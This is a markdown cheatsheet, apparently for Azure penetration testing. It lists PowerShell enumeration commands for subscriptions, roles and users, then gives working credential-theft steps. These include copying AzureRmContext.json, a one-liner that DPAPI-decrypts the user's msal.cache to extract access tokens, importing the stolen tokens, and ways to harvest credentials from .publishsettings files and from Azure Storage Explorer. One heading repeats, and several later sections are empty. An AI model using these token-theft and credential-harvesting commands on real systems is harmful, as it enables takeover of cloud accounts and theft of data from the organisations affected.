# Azure pentesting cheatsheet
## Enumeration
#### Connect to Azure
```
Connect-AzAccount
```

#### Connect to MSOL
```
connect-msolservice
```

#### Get basic information
- Interesting information: UsersPermissionToReadOtherUsersEnabled, DirSyncServiceAccount, PasswordSynchronizationEnabled, Address/phone/emails
```
Get-MSolCompanyInformation
```

#### Get the AZ subscriptions the user has access too
```
Get-AzSubscription
```

#### List the current context
```
Get-AzContext | fl *
```

#### Enumerate the roles of the current user
```
Get-AzRoleAssignment
```

#### List users of the subscription
```
Get-MSolUser -All
```

#### Get all commands for AZ and MSOnline
```
Get-Module -Name Az.Accounts | Select-Object -ExpandProperty ExportedCommands
Get-Module -Name MSOnline | Select-Object -ExpandProperty ExportedCommands
```

## Lateral Movement
### Stealing Azure tokens
- https://github.com/rvrsh3ll/TokenTactics
#### User access tokens method 1
#### Save the AzureRmContext.json
```
cp %USERPROFILE%\.Azure\AzureRmContext.json C:\temp\AzureRmContext.json
```

#### Get the authenticated token for the user
```
Add-Type -AssemblyName System.Security; [Convert]::ToBase64String([Security.Cryptography.ProtectedData]::Unprotect((([Text.Encoding]::Default).GetBytes((Get-Content -raw "$env:userprofile\AppData\Local\.IdentityService\msal.cache"))), $null, [Security.Cryptography.DataProtectionScope]::CurrentUser))
```

#### Save the token into AzureRmContext.json
-  Open AzureRmContext.json file in a notepad and find the line near the end of the file title “CacheData”. It should be null.

#### Import the token
```
Import-AzContext -Path 'C:\Temp\Live Tokens\StolenToken.json’
```

#### User access tokens method 1
#### Save azcontext
```
Save-AzContext -Path C:\Temp\AzureAccessToken.json
```

#### Import the token
```
Import-AzContext -Path 'C:\Temp\Live Tokens\StolenToken.json’
```

### Visual Studio Code
- Azure Cloud Service Packages (.cspkg)
- Deployment files created by Visual Studio.
- Possible other Azure services integration (SQL, storage, etc.)
- Through cspkg zip files for creds/certs.
- Search Visual Studio Public Directory ```<cloud project directory>\bin\debug\publish```

#### Publish settings in files
- Look for file ```.publishsettings```
- Can contain a Base64 encoded Management Certificate or cleartext credentials
- Save "ManagementCertificate" section into a new .pfx file
- Search the user's Downloads directory and VS projects.

#### Storage explorers
- Windows Credential Manager stores these credentials.
- Azure Storage Explorer for example has a built-in “Developer Tools” function that you can use to set breakpoints while loading the credentials allowing you to view them while unencrypted.



## Exploitation

## Privilege escalation

## Persistence
